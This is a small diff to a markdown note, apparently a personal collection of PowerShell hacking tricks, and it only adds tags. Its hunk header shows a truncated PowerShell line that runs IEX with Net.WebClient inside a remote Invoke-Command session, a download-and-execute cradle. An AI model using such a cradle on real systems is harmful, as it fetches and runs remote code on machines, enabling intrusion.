@@ -11,4 +11,4 @@ Invoke-Command -Session $sess -ScriptBlock { IEX(New-Object Net.WebClient).downl
 - ~/kb/hacking/powershell/powershell-tricks.md
 
 Tags:
-    #assorted
+    #assorted #hacking #trick #powershell
